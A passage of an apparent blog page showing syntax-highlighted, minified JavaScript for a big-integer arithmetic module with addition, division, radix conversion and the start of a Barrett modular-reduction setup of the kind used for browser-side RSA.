class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">        <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line">        <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(t, <span class="string">&quot;__esModule&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">value</span>: !<span class="number">0</span></span><br><span class="line">        &#125;),</span><br><span class="line">        t.<span class="property">default</span> = <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">var</span> n, r, o, a = <span class="number">16</span>, u = a, l = <span class="number">65536</span>, c = l &gt;&gt;&gt; <span class="number">1</span>, s = l * l, d = l - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            n = <span class="keyword">new</span> <span class="title class_">Array</span>(e);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="number">0</span>; t &lt; n.<span class="property">length</span>; t++)</span><br><span class="line">                n[t] = <span class="number">0</span>;</span><br><span class="line">            r = <span class="keyword">new</span> p,</span><br><span class="line">            (o = <span class="keyword">new</span> p).<span class="property">digits</span>[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">f</span>(<span class="number">20</span>);</span><br><span class="line">        <span class="title function_">g</span>(<span class="number">1e15</span>);</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">p</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">digits</span> = <span class="string">&quot;boolean&quot;</span> == <span class="keyword">typeof</span> e &amp;&amp; <span class="number">1</span> == e ? <span class="literal">null</span> : n.<span class="title function_">slice</span>(<span class="number">0</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isNeg</span> = !<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">m</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="keyword">new</span> <span class="title function_">p</span>(!<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> t.<span class="property">digits</span> = e.<span class="property">digits</span>.<span class="title function_">slice</span>(<span class="number">0</span>),</span><br><span class="line">            t.<span class="property">isNeg</span> = e.<span class="property">isNeg</span>,</span><br><span class="line">            t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">g</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="keyword">new</span> p;</span><br><span class="line">            t.<span class="property">isNeg</span> = e &lt; <span class="number">0</span>,</span><br><span class="line">            e = <span class="title class_">Math</span>.<span class="title function_">abs</span>(e);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>; e &gt; <span class="number">0</span>; )</span><br><span class="line">                t.<span class="property">digits</span>[n++] = e &amp; d,</span><br><span class="line">                e &gt;&gt;= a;</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">h</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = e.<span class="property">length</span> - <span class="number">1</span>; n &gt; -<span class="number">1</span>; --n)</span><br><span class="line">                t += e.<span class="title function_">charAt</span>(n);</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> _ = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;7&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;9&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;f&quot;</span>,<span class="string">&quot;g&quot;</span>,<span class="string">&quot;h&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;j&quot;</span>,<span class="string">&quot;k&quot;</span>,<span class="string">&quot;l&quot;</span>,<span class="string">&quot;m&quot;</span>,<span class="string">&quot;n&quot;</span>,<span class="string">&quot;o&quot;</span>,<span class="string">&quot;p&quot;</span>,<span class="string">&quot;q&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="string">&quot;s&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;u&quot;</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="string">&quot;y&quot;</span>,<span class="string">&quot;z&quot;</span>);</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">T</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="keyword">new</span> p;</span><br><span class="line">            n.<span class="property">digits</span>[<span class="number">0</span>] = t;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="title function_">x</span>(e, n), i = _[o[<span class="number">1</span>].<span class="property">digits</span>[<span class="number">0</span>]]; <span class="number">1</span> == <span class="title function_">G</span>(o[<span class="number">0</span>], r); )</span><br><span class="line">                o = <span class="title function_">x</span>(o[<span class="number">0</span>], n),</span><br><span class="line">                digit = o[<span class="number">1</span>].<span class="property">digits</span>[<span class="number">0</span>],</span><br><span class="line">                i += _[o[<span class="number">1</span>].<span class="property">digits</span>[<span class="number">0</span>]];</span><br><span class="line">            <span class="keyword">return</span> (e.<span class="property">isNeg</span> ? <span class="string">&quot;-&quot;</span> : <span class="string">&quot;&quot;</span>) + <span class="title function_">h</span>(i)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> E = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;7&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;9&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;f&quot;</span>);</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">y</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">                t += E[<span class="number">15</span> &amp; e],</span><br><span class="line">                e &gt;&gt;&gt;= <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">h</span>(t)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">S</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = (<span class="title function_">I</span>(e),</span><br><span class="line">            <span class="title function_">I</span>(e)); n &gt; -<span class="number">1</span>; --n)</span><br><span class="line">                t += <span class="title function_">y</span>(e.<span class="property">digits</span>[n]);</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">v</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> e &gt;= <span class="number">48</span> &amp;&amp; e &lt;= <span class="number">57</span> ? e - <span class="number">48</span> : e &gt;= <span class="number">65</span> &amp;&amp; e &lt;= <span class="number">90</span> ? <span class="number">10</span> + e - <span class="number">65</span> : e &gt;= <span class="number">97</span> &amp;&amp; e &lt;= <span class="number">122</span> ? <span class="number">10</span> + e - <span class="number">97</span> : <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">A</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="number">0</span>, n = <span class="title class_">Math</span>.<span class="title function_">min</span>(e.<span class="property">length</span>, <span class="number">4</span>), r = <span class="number">0</span>; r &lt; n; ++r)</span><br><span class="line">                t &lt;&lt;= <span class="number">4</span>,</span><br><span class="line">                t |= <span class="title function_">v</span>(e.<span class="title function_">charCodeAt</span>(r));</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">C</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="keyword">new</span> p, n = e.<span class="property">length</span>, r = <span class="number">0</span>; n &gt; <span class="number">0</span>; n -= <span class="number">4</span>,</span><br><span class="line">            ++r)</span><br><span class="line">                t.<span class="property">digits</span>[r] = <span class="title function_">A</span>(e.<span class="title function_">substr</span>(<span class="title class_">Math</span>.<span class="title function_">max</span>(n - <span class="number">4</span>, <span class="number">0</span>), <span class="title class_">Math</span>.<span class="title function_">min</span>(n, <span class="number">4</span>)));</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">b</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = <span class="title function_">I</span>(e); n &gt; -<span class="number">1</span>; --n)</span><br><span class="line">                t += <span class="title function_">D</span>(e.<span class="property">digits</span>[n]);</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">D</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">255</span> &amp; e);</span><br><span class="line">            <span class="keyword">return</span> e &gt;&gt;&gt;= <span class="number">8</span>,</span><br><span class="line">            <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">255</span> &amp; e) + t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">P</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n;</span><br><span class="line">            <span class="keyword">if</span> (e.<span class="property">isNeg</span> != t.<span class="property">isNeg</span>)</span><br><span class="line">                t.<span class="property">isNeg</span> = !t.<span class="property">isNeg</span>,</span><br><span class="line">                n = <span class="title function_">O</span>(e, t),</span><br><span class="line">                t.<span class="property">isNeg</span> = !t.<span class="property">isNeg</span>;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                n = <span class="keyword">new</span> p;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> r, o = <span class="number">0</span>, i = <span class="number">0</span>; i &lt; e.<span class="property">digits</span>.<span class="property">length</span>; ++i)</span><br><span class="line">                    r = e.<span class="property">digits</span>[i] + t.<span class="property">digits</span>[i] + o,</span><br><span class="line">                    n.<span class="property">digits</span>[i] = <span class="number">65535</span> &amp; r,</span><br><span class="line">                    o = <span class="title class_">Number</span>(r &gt;= l);</span><br><span class="line">                n.<span class="property">isNeg</span> = e.<span class="property">isNeg</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">O</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n;</span><br><span class="line">            <span class="keyword">if</span> (e.<span class="property">isNeg</span> != t.<span class="property">isNeg</span>)</span><br><span class="line">                t.<span class="property">isNeg</span> = !t.<span class="property">isNeg</span>,</span><br><span class="line">                n = <span class="title function_">P</span>(e, t),</span><br><span class="line">                t.<span class="property">isNeg</span> = !t.<span class="property">isNeg</span>;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">var</span> r, o;</span><br><span class="line">                n = <span class="keyword">new</span> p,</span><br><span class="line">                o = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; e.<span class="property">digits</span>.<span class="property">length</span>; ++i)</span><br><span class="line">                    r = e.<span class="property">digits</span>[i] - t.<span class="property">digits</span>[i] + o,</span><br><span class="line">                    n.<span class="property">digits</span>[i] = <span class="number">65535</span> &amp; r,</span><br><span class="line">                    n.<span class="property">digits</span>[i] &lt; <span class="number">0</span> &amp;&amp; (n.<span class="property">digits</span>[i] += l),</span><br><span class="line">                    o = <span class="number">0</span> - <span class="title class_">Number</span>(r &lt; <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> (-<span class="number">1</span> == o) &#123;</span><br><span class="line">                    o = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; e.<span class="property">digits</span>.<span class="property">length</span>; ++i)</span><br><span class="line">                        r = <span class="number">0</span> - n.<span class="property">digits</span>[i] + o,</span><br><span class="line">                        n.<span class="property">digits</span>[i] = <span class="number">65535</span> &amp; r,</span><br><span class="line">                        n.<span class="property">digits</span>[i] &lt; <span class="number">0</span> &amp;&amp; (n.<span class="property">digits</span>[i] += l),</span><br><span class="line">                        o = <span class="number">0</span> - <span class="title class_">Number</span>(r &lt; <span class="number">0</span>);</span><br><span class="line">                    n.<span class="property">isNeg</span> = !e.<span class="property">isNeg</span></span><br><span class="line">                &#125; <span class="keyword">else</span></span><br><span class="line">                    n.<span class="property">isNeg</span> = e.<span class="property">isNeg</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">I</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = e.<span class="property">digits</span>.<span class="property">length</span> - <span class="number">1</span>; t &gt; <span class="number">0</span> &amp;&amp; <span class="number">0</span> == e.<span class="property">digits</span>[t]; )</span><br><span class="line">                --t;</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">L</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t, n = <span class="title function_">I</span>(e), r = e.<span class="property">digits</span>[n], o = (n + <span class="number">1</span>) * u;</span><br><span class="line">            <span class="keyword">for</span> (t = o; t &gt; o - u &amp;&amp; <span class="number">0</span> == (<span class="number">32768</span> &amp; r); --t)</span><br><span class="line">                r &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">R</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> n, r, o, i = <span class="keyword">new</span> p, u = <span class="title function_">I</span>(e), l = <span class="title function_">I</span>(t), c = <span class="number">0</span>; c &lt;= l; ++c) &#123;</span><br><span class="line">                n = <span class="number">0</span>,</span><br><span class="line">                o = c;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> s = <span class="number">0</span>; s &lt;= u; ++s,</span><br><span class="line">                ++o)</span><br><span class="line">                    r = i.<span class="property">digits</span>[o] + e.<span class="property">digits</span>[s] * t.<span class="property">digits</span>[c] + n,</span><br><span class="line">                    i.<span class="property">digits</span>[o] = r &amp; d,</span><br><span class="line">                    n = r &gt;&gt;&gt; a;</span><br><span class="line">                i.<span class="property">digits</span>[c + u + <span class="number">1</span>] = n</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> i.<span class="property">isNeg</span> = e.<span class="property">isNeg</span> != t.<span class="property">isNeg</span>,</span><br><span class="line">            i</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">N</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n, r, o, i;</span><br><span class="line">            i = <span class="keyword">new</span> p,</span><br><span class="line">            n = <span class="title function_">I</span>(e),</span><br><span class="line">            r = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> u = <span class="number">0</span>; u &lt;= n; ++u)</span><br><span class="line">                o = i.<span class="property">digits</span>[u] + e.<span class="property">digits</span>[u] * t + r,</span><br><span class="line">                i.<span class="property">digits</span>[u] = o &amp; d,</span><br><span class="line">                r = o &gt;&gt;&gt; a;</span><br><span class="line">            <span class="keyword">return</span> i.<span class="property">digits</span>[<span class="number">1</span> + n] = r,</span><br><span class="line">            i</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">w</span>(<span class="params">e, t, n, r, o</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="title class_">Math</span>.<span class="title function_">min</span>(t + o, e.<span class="property">length</span>), a = t, u = r; a &lt; i; ++a,</span><br><span class="line">            ++u)</span><br><span class="line">                n[u] = e[a]</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> k = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0</span>,<span class="number">32768</span>,<span class="number">49152</span>,<span class="number">57344</span>,<span class="number">61440</span>,<span class="number">63488</span>,<span class="number">64512</span>,<span class="number">65024</span>,<span class="number">65280</span>,<span class="number">65408</span>,<span class="number">65472</span>,<span class="number">65504</span>,<span class="number">65520</span>,<span class="number">65528</span>,<span class="number">65532</span>,<span class="number">65534</span>,<span class="number">65535</span>);</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">M</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="title class_">Math</span>.<span class="title function_">floor</span>(t / u)</span><br><span class="line">              , r = <span class="keyword">new</span> p;</span><br><span class="line">            <span class="title function_">w</span>(e.<span class="property">digits</span>, <span class="number">0</span>, r.<span class="property">digits</span>, n, r.<span class="property">digits</span>.<span class="property">length</span> - n);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> o = t % u, i = u - o, a = r.<span class="property">digits</span>.<span class="property">length</span> - <span class="number">1</span>, l = a - <span class="number">1</span>; a &gt; <span class="number">0</span>; --a,</span><br><span class="line">            --l)</span><br><span class="line">                r.<span class="property">digits</span>[a] = r.<span class="property">digits</span>[a] &lt;&lt; o &amp; d | (r.<span class="property">digits</span>[l] &amp; k[o]) &gt;&gt;&gt; i;</span><br><span class="line">            <span class="keyword">return</span> r.<span class="property">digits</span>[<span class="number">0</span>] = r.<span class="property">digits</span>[a] &lt;&lt; o &amp; d,</span><br><span class="line">            r.<span class="property">isNeg</span> = e.<span class="property">isNeg</span>,</span><br><span class="line">            r</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> Y = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">31</span>,<span class="number">63</span>,<span class="number">127</span>,<span class="number">255</span>,<span class="number">511</span>,<span class="number">1023</span>,<span class="number">2047</span>,<span class="number">4095</span>,<span class="number">8191</span>,<span class="number">16383</span>,<span class="number">32767</span>,<span class="number">65535</span>);</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">F</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="title class_">Math</span>.<span class="title function_">floor</span>(t / u)</span><br><span class="line">              , r = <span class="keyword">new</span> p;</span><br><span class="line">            <span class="title function_">w</span>(e.<span class="property">digits</span>, n, r.<span class="property">digits</span>, <span class="number">0</span>, e.<span class="property">digits</span>.<span class="property">length</span> - n);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> o = t % u, i = u - o, a = <span class="number">0</span>, l = a + <span class="number">1</span>; a &lt; r.<span class="property">digits</span>.<span class="property">length</span> - <span class="number">1</span>; ++a,</span><br><span class="line">            ++l)</span><br><span class="line">                r.<span class="property">digits</span>[a] = r.<span class="property">digits</span>[a] &gt;&gt;&gt; o | (r.<span class="property">digits</span>[l] &amp; Y[o]) &lt;&lt; i;</span><br><span class="line">            <span class="keyword">return</span> r.<span class="property">digits</span>[r.<span class="property">digits</span>.<span class="property">length</span> - <span class="number">1</span>] &gt;&gt;&gt;= o,</span><br><span class="line">            r.<span class="property">isNeg</span> = e.<span class="property">isNeg</span>,</span><br><span class="line">            r</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">H</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="keyword">new</span> p;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">w</span>(e.<span class="property">digits</span>, <span class="number">0</span>, n.<span class="property">digits</span>, t, n.<span class="property">digits</span>.<span class="property">length</span> - t),</span><br><span class="line">            n</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">U</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="keyword">new</span> p;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">w</span>(e.<span class="property">digits</span>, t, n.<span class="property">digits</span>, <span class="number">0</span>, n.<span class="property">digits</span>.<span class="property">length</span> - t),</span><br><span class="line">            n</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">B</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="keyword">new</span> p;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">w</span>(e.<span class="property">digits</span>, <span class="number">0</span>, n.<span class="property">digits</span>, <span class="number">0</span>, t),</span><br><span class="line">            n</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">G</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e.<span class="property">isNeg</span> != t.<span class="property">isNeg</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span> - <span class="number">2</span> * <span class="title class_">Number</span>(e.<span class="property">isNeg</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> n = e.<span class="property">digits</span>.<span class="property">length</span> - <span class="number">1</span>; n &gt;= <span class="number">0</span>; --n)</span><br><span class="line">                <span class="keyword">if</span> (e.<span class="property">digits</span>[n] != t.<span class="property">digits</span>[n])</span><br><span class="line">                    <span class="keyword">return</span> e.<span class="property">isNeg</span> ? <span class="number">1</span> - <span class="number">2</span> * <span class="title class_">Number</span>(e.<span class="property">digits</span>[n] &gt; t.<span class="property">digits</span>[n]) : <span class="number">1</span> - <span class="number">2</span> * <span class="title class_">Number</span>(e.<span class="property">digits</span>[n] &lt; t.<span class="property">digits</span>[n]);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">x</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n, r, i = <span class="title function_">L</span>(e), a = <span class="title function_">L</span>(t), f = t.<span class="property">isNeg</span>;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; a)</span><br><span class="line">                <span class="keyword">return</span> e.<span class="property">isNeg</span> ? ((n = <span class="title function_">m</span>(o)).<span class="property">isNeg</span> = !t.<span class="property">isNeg</span>,</span><br><span class="line">                e.<span class="property">isNeg</span> = !<span class="number">1</span>,</span><br><span class="line">                t.<span class="property">isNeg</span> = !<span class="number">1</span>,</span><br><span class="line">                r = <span class="title function_">O</span>(t, e),</span><br><span class="line">                e.<span class="property">isNeg</span> = !<span class="number">0</span>,</span><br><span class="line">                t.<span class="property">isNeg</span> = f) : (n = <span class="keyword">new</span> p,</span><br><span class="line">                r = <span class="title function_">m</span>(e)),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Array</span>(n,r);</span><br><span class="line">            n = <span class="keyword">new</span> p,</span><br><span class="line">            r = e;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> g = <span class="title class_">Math</span>.<span class="title function_">ceil</span>(a / u) - <span class="number">1</span>, h = <span class="number">0</span>; t.<span class="property">digits</span>[g] &lt; c; )</span><br><span class="line">                t = <span class="title function_">M</span>(t, <span class="number">1</span>),</span><br><span class="line">                ++h,</span><br><span class="line">                ++a,</span><br><span class="line">                g = <span class="title class_">Math</span>.<span class="title function_">ceil</span>(a / u) - <span class="number">1</span>;</span><br><span class="line">            r = <span class="title function_">M</span>(r, h),</span><br><span class="line">            i += h;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> _ = <span class="title class_">Math</span>.<span class="title function_">ceil</span>(i / u) - <span class="number">1</span>, T = <span class="title function_">H</span>(t, _ - g); -<span class="number">1</span> != <span class="title function_">G</span>(r, T); )</span><br><span class="line">                ++n.<span class="property">digits</span>[_ - g],</span><br><span class="line">                r = <span class="title function_">O</span>(r, T);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> E = _; E &gt; g; --E) &#123;</span><br><span class="line">                <span class="keyword">var</span> y = E &gt;= r.<span class="property">digits</span>.<span class="property">length</span> ? <span class="number">0</span> : r.<span class="property">digits</span>[E]</span><br><span class="line">                  , S = E - <span class="number">1</span> &gt;= r.<span class="property">digits</span>.<span class="property">length</span> ? <span class="number">0</span> : r.<span class="property">digits</span>[E - <span class="number">1</span>]</span><br><span class="line">                  , v = E - <span class="number">2</span> &gt;= r.<span class="property">digits</span>.<span class="property">length</span> ? <span class="number">0</span> : r.<span class="property">digits</span>[E - <span class="number">2</span>]</span><br><span class="line">                  , A = g &gt;= t.<span class="property">digits</span>.<span class="property">length</span> ? <span class="number">0</span> : t.<span class="property">digits</span>[g]</span><br><span class="line">                  , C = g - <span class="number">1</span> &gt;= t.<span class="property">digits</span>.<span class="property">length</span> ? <span class="number">0</span> : t.<span class="property">digits</span>[g - <span class="number">1</span>];</span><br><span class="line">                n.<span class="property">digits</span>[E - g - <span class="number">1</span>] = y == A ? d : <span class="title class_">Math</span>.<span class="title function_">floor</span>((y * l + S) / A);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> b = n.<span class="property">digits</span>[E - g - <span class="number">1</span>] * (A * l + C), D = y * s + (S * l + v); b &gt; D; )</span><br><span class="line">                    --n.<span class="property">digits</span>[E - g - <span class="number">1</span>],</span><br><span class="line">                    b = n.<span class="property">digits</span>[E - g - <span class="number">1</span>] * (A * l | C),</span><br><span class="line">                    D = y * l * l + (S * l + v);</span><br><span class="line">                (r = <span class="title function_">O</span>(r, <span class="title function_">N</span>(T = <span class="title function_">H</span>(t, E - g - <span class="number">1</span>), n.<span class="property">digits</span>[E - g - <span class="number">1</span>]))).<span class="property">isNeg</span> &amp;&amp; (r = <span class="title function_">P</span>(r, T),</span><br><span class="line">                --n.<span class="property">digits</span>[E - g - <span class="number">1</span>])</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> r = <span class="title function_">F</span>(r, h),</span><br><span class="line">            n.<span class="property">isNeg</span> = e.<span class="property">isNeg</span> != f,</span><br><span class="line">            e.<span class="property">isNeg</span> &amp;&amp; (n = f ? <span class="title function_">P</span>(n, o) : <span class="title function_">O</span>(n, o),</span><br><span class="line">            r = <span class="title function_">O</span>(t = <span class="title function_">F</span>(t, h), r)),</span><br><span class="line">            <span class="number">0</span> == r.<span class="property">digits</span>[<span class="number">0</span>] &amp;&amp; <span class="number">0</span> == <span class="title function_">I</span>(r) &amp;&amp; (r.<span class="property">isNeg</span> = !<span class="number">1</span>),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Array</span>(n,r)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">Z</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">modulus</span> = <span class="title function_">m</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">k</span> = <span class="title function_">I</span>(<span class="variable language_">this</span>.<span class="property">modulus</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">var</span> t, n, r = <span class="keyword">new</span> p;</span><br><span class="line">            r.<span class="property">digits</span>[<span class="number">2</span> * <span class="variable language_">this</span>.<span class="property">k</span>] = <span class="number">1</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">mu</span> = (t = r,</span><br><span class="line">            n = <span class="variable language_">this</span>.<span class="property">modulus</span>,</span><br><span class="line">            <span class="title function_">x</span>(t, n)[<span class="number">0</span>]),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">bkplus1</span> = <span class="keyword">new</span> p,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">bkplus1</span>.<span class="property">digits</span>[<span class="variable language_">this</span>.<span class="property">k</span> + <span class="number">1</span>] = <span class="number">1</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">modulo</span> = J,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">multiplyMod</span> = X,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">powMod</span> = j</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">J</span>(<span 